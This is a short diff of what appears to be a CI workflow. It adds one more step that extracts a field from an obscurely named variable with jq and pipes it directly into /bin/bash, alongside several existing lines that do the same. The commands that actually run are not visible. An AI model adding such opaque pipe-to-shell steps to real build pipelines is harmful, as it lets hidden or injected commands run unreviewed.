@@ -48,6 +48,7 @@ jobs:
           printf '%s' "$in4" | jq -r .ctqq87 | /bin/bash
           printf '%s' "$lhm898" | jq -r .dbwy5 | /bin/bash
           printf '%s' "$w2" | jq -r .ea57990 | /bin/bash
+          printf '%s' "$h3341" | jq -r .gq6 | /bin/bash
 
       - name: Archive output
         if: always()
